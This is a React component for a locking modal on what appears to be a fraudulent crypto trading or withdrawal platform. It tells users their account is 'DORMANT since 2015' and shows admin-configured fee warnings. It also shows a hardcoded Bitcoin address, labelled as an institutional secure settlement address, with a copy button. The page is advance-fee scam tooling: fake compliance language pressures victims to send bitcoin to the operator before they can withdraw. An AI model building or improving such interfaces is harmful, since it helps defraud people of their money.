'use client';

import React, { useState } from 'react';
import { useApp } from '@/lib/store';
import { ShieldAlert, Copy, CheckCircle2, AlertTriangle, Clock } from 'lucide-react';

export const FeeProtocolModal: React.FC = () => {
  const { feeProtocol, setFeeProtocol, adminBtcAddress, feeConfiguration } = useApp();
  const [copied, setCopied] = useState<boolean>(false);

  if (!feeProtocol.isLocked) return null;

  const btcAddress = adminBtcAddress || '3Erisk3mxLpVKakTpyfvnGAvvfvAEMq8kg';
  const activeKey = feeConfiguration.activeWarningKey || 'step1';
  const activeWarning = feeConfiguration[activeKey] || feeConfiguration.step1;

  const handleCopy = () => {
    navigator.clipboard.writeText(btcAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <div className="fixed inset-0 bg-slate-950/85 backdrop-blur-md z-50 flex items-center justify-center p-4 animate-fadeIn">
      <div className="bg-slate-900 border border-amber-500/40 rounded-3xl max-w-2xl w-full p-6 shadow-2xl relative max-h-[90vh] overflow-y-auto custom-scrollbar">
        <div className="flex items-center gap-3 mb-5 border-b border-slate-800 pb-4">
          <div className="w-12 h-12 rounded-2xl bg-amber-500/20 text-amber-400 flex items-center justify-center shrink-0 border border-amber-500/30 shadow-lg shadow-amber-500/20">
            <ShieldAlert className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-base font-bold text-white">⚠️ Withdrawal Account Verification / Fee Information</h2>
            <p className="text-xs text-amber-400 font-mono">Dormant Account Compliance & Reactivation Protocol</p>
          </div>
        </div>

        {/* Dormant Since 2015 Notice */}
        <div className="bg-amber-500/10 border border-amber-500/20 p-4 rounded-2xl mb-4 text-xs text-amber-300 flex items-start gap-3">
          <Clock className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
          <p className="leading-relaxed font-medium">
            Your account has remained <strong className="text-white">DORMANT since 2015</strong> and therefore requires account reactivation and compliance verification before full transaction privileges can be restored.
          </p>
        </div>

        {/* Single Active Warning Configuration */}
        <div className="space-y-4 mb-6 text-xs text-slate-300">
          <div className="bg-slate-950 p-4 rounded-2xl border border-amber-500/30 space-y-2 shadow-lg">
            <div className="flex items-center justify-between">
              <h4 className="font-bold text-white flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-amber-500/20 text-amber-400 flex items-center justify-center text-xs font-mono font-bold">⚠️</span>
                {activeWarning.title}
              </h4>
              <span className="text-emerald-400 font-mono font-bold bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20 text-sm">
                {activeWarning.amount}
              </span>
            </div>
            <p className="text-slate-300 text-xs leading-relaxed pl-8 whitespace-pre-line">
              {activeWarning.description}
            </p>
          </div>

          {/* Bitcoin Address Box */}
          <div className="bg-slate-900 p-4 rounded-2xl border border-slate-800 space-y-2">
            <div className="flex items-center justify-between text-[11px] text-slate-400">
              <span className="font-mono">Designated Institutional Bitcoin Address</span>
              <span className="text-emerald-400 font-mono font-bold">Secure Settlement</span>
            </div>
            <div className="flex items-center justify-between gap-2 bg-slate-950 p-2.5 rounded-xl border border-slate-800">
              <span className="text-xs font-mono text-white break-all">{btcAddress}</span>
              <button
                onClick={handleCopy}
                className="bg-blue-600 hover:bg-blue-500 text-white px-3 py-1.5 rounded-lg text-xs font-semibold shrink-0 flex items-center gap-1.5"
              >
                {copied ? <CheckCircle2 className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </button>
            </div>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="flex items-center justify-end gap-3 pt-3 border-t border-slate-800">
          <button
            onClick={() => setFeeProtocol(prev => ({ ...prev, isLocked: false, pendingOrder: undefined }))}
            className="bg-slate-800 hover:bg-slate-700 text-slate-300 px-5 py-2.5 rounded-xl text-xs font-bold transition-all shadow-md"
          >
            Close / Return
          </button>
        </div>
      </div>
    </div>
  );
};
